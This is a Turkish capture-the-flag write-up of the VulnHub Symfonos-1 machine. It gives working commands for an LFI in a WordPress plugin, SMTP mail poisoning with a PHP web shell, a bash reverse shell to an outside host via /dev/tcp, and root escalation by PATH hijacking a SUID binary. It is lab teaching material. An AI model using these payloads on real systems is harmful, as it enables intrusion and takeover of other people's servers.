---
title: "VULNHUB Symfonos-1 Write up"
date: 2020-10-04T18:13:49+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,lfi,curl,smtp,CVE:2018-7422] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/symfonos-1,322/) 'da yer alan Symfonos-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/symfonos1/cover.png
  
---
Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/symfonos-1,322/) 'da yer alan Symfonos-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar... :blush:

İlk olarak tasarımcı tarafından belirtilen alan adı */etc/hosts* dosyasına ```ip adresi  symfonos.local``` şeklinde eklenir.

{{< image src="/images/vulnhub/symfonos1/desc.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/symfonos1/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.

```bash
sudo nmap -sV -sC -p- 192.168.56.114
```

```terminal
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 07:36 CDT
Nmap scan report for 192.168.56.114 (192.168.56.114)
Host is up (0.00011s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:47:66:4F (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h39m59s, deviation: 2h53m12s, median: 2h59m59s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2020-10-03T10:36:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-03T15:36:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
```
İlk göze çarpan 139 ve 445 numaralı portlarda çalışan Samba ve 25 numaralı portta çalışan mail servisidir. 

Samba servisinde paylaşıma açık olan dosya ve klasörler *smbclient* ile kontrol edilir.
```bash
smbclient  -L //192.168.56.114/
```

{{< image src="/images/vulnhub/symfonos1/smb1.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Şifresiz paylaşıma açık olan anonymous dizini kontrol edilir.

```bash
smbclient //192.168.56.114/anonymous
```
{{< image src="/images/vulnhub/symfonos1/smb2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**get** komutu ile dosya indirilir ve içeriği görüntülenir.

{{< image src="/images/vulnhub/symfonos1/atten.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Zeus efendi kullanıcıların aynı parolaları kullanmalarından epeyce kızmış anlaşılan... :rofl:

helios klasörüne *qwerty* parolası ile erişim sağlanmaktadır.

```bash
smbclient  //192.168.56.114/helios -U helios
```
{{< image src="/images/vulnhub/symfonos1/smb3.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Paylaşılan dosyalar get komutu ile indirilir ve içerikleri görüntülenir. Yapılacaklar adlı dosyada **/h3l105** dizini dikkat çekmektedir. 

{{< image src="/images/vulnhub/symfonos1/todo.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Tarayıcı ile web servisine istek atılır. Açılan sayfada sadece bir resim vardır. Daha sonra elde edilen dizine (```http://symfonos.local/h3l105```) istek atıldığında wordpress uygulaması karşımıza çıkmaktadır.

{{< image src="/images/vulnhub/symfonos1/web2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**Wpscan** aracı ile web sayfasında tarama yapılır. Wordpress sürümü, sistemdeki kullanıcılar vb. bir çok bilgi tespit edilir. Upload klasörünün erişime açık olduğu bilgisi dikkat çekmektedir.

{{< image src="/images/vulnhub/symfonos1/wpscan.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Uploads klasörüne girildiğinde **siteeditor** adında klasör görülmektedir. Yapılan araştırma wordpress plugin olduğu ve uygulamaya ait *LFI* açığı olduğu tespit edilmektedir.

{{< image src="/images/vulnhub/symfonos1/expdb.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Exploit detaylarına bakıldığında lfi zafiyetinin olduğu dizin ve parametreler aşağıda görülmektedir.

{{< image src="/images/vulnhub/symfonos1/expdb2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

/etc/passwd dosyasını okunmaya çalışılır. 

```text
http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

{{< image src="/images/vulnhub/symfonos1/lfi.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
Bu aşamadan sonra mail servisinde keşif yapılır. smtp-user-enum aracı ile helios kullanıcısı doğrulaması gerçekleştirilir. 

```bash
smtp-user-enum -u helios -t 192.168.56.114
```
```terminal
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Oct  3 08:13:56 2020 #########
192.168.56.114: helios exists
######## Scan completed at Sat Oct  3 08:13:56 2020 #########
1 results.

1 queries in 1 seconds (1.0 queries / sec)
```
**Helios** kullanıcısına mail servisinden zararlı kodun bulunduğu bir mail gönderilir. LFI ile mail okunarak zararlı kod çalıştırılır. 

İlk olarak **nc** veya **telnet** ile smtp servisine bağlanılır.
```terminal
nc 192.168.56.114 25
```
    **En önemli SMTP komutları aşağıdaki gibidir.

    HELP: Komutlar listelenir.
    HELO: SMTP sunucusu ile SMTP iletişimi başlatılır.
    EHLO: Genişletilmiş SMTP iletişimi için kullanılır.
    AUTH: İstemcinin kimlik doğrulaması için kullanılır.
    MAIL FROM: E-posta göndericisi belirtilir.
    RCPT TO: E-posta alıcısı belirtilir.
    DATA: E-postanın içeriği belirtilir. E-posta içeriği, “.” ifadesi içeren satır ile tamamlanmış olur.
    SUBJECT: E-postanın konusu belirtilir.
    QUIT: Oturum sonlandırılır.
    VRFY: E-posta kutusu alıcısı doğrulanır.
    EXPN: E-posta listesi doğrulanır.
    STARTTLS: SMTP iletişimi TLS üzerinden başlatılır.
    RSET: E-posta iletişimi kesilir.

Yukarıdaki komutlar çerçevesinde root kullanıcısından helios kullanıcısına cmd parametresi ile gönderilen komutun çalıştırılabileceği php kodu gönderilir.
```php
<?php echo system($_REQUEST["cmd"]); ?>
```

```terminal
─[barcode@parrot]─[~]$ nc 192.168.56.114 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
helo symfonos@localdomain
250 symfonos.localdomain
mail from:root@symfonos.localdomain
250 2.1.0 Ok
rcpt to:helios@symfonos.localdomain
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php echo system($_REQUEST["cmd"]); ?>
.
250 2.0.0 Ok: queued as D547140698
```
Tarayıcından */var/mail/* dizini altında helios kullanıcısının maillerinin tutulduğu helios dosyası okunarak zararlı kod çalıştırılır. İlk olarak ***cmd=ls -l*** test edilir.

```html
../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=ls -l
```

{{< image src="/images/vulnhub/symfonos1/lfi2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

 ```cmd=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.105/4444 0>&1'``` şeklinde istek atılarak  4444 numaralı porttan **helios** kullanıcısı yetkisi ile terminal bağlantısı sağlanır.
```txt
../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.105/4444 0>&1'
```

## 3. Yetki Yükseltme

Python pty modülü kullanılarak etkileşimli kabuğa geçilir.
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```
İlk olarak ```sudo -l``` komutu çalıştırıldığında, komut bulunamadı hatası ile karşılaşılır. Sistem de suid biti aktif dosyalar için araştırma yapılır.

```bash
find / -perm -u=s -type f 2>/dev/null
```

{{< image src="/images/vulnhub/symfonos1/suid.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

/opt dizini altında yer alan **statuscheck** adlı uygulama dikkat çekmektedir. Dosya sahibinin root olduğu görülmektedir.

{{< image src="/images/vulnhub/symfonos1/own.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Uygulama çalıştırıldığında apache sunucusuna istek atıldığı dönen paketin header bilgisinin ekrana basıldığı görülmektedir. Strings aracı ile uygulama içerisinde yer alan string ifadeler çıkarılır.

{{< image src="/images/vulnhub/symfonos1/content.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Curl komutu ile localhosta istek atıldığı görülmektedir. Ayrıca curl komutu için tam path verilmemiştir. Bu kapsamda;
1. */home/helios* dizininde curl adında bir dosya oluşturulur.
2. ***curl*** dosyası içerisine shell oturumu için kodlar eklenir.
3. **PATH** değişkeninin başına curl dosya pathi eklenir.

```bash
echo "/bin/sh" > curl
export PATH=/home/helios:$PATH
/opt/statuscheck
```
Dosya çalıştırıldığında root yetkisi ile oturum elde edilir.

{{< image src="/images/vulnhub/symfonos1/priv.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Proof.txt okunarak makina çözümleri tamamlanır.

{{< image src="/images/vulnhub/symfonos1/flag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}




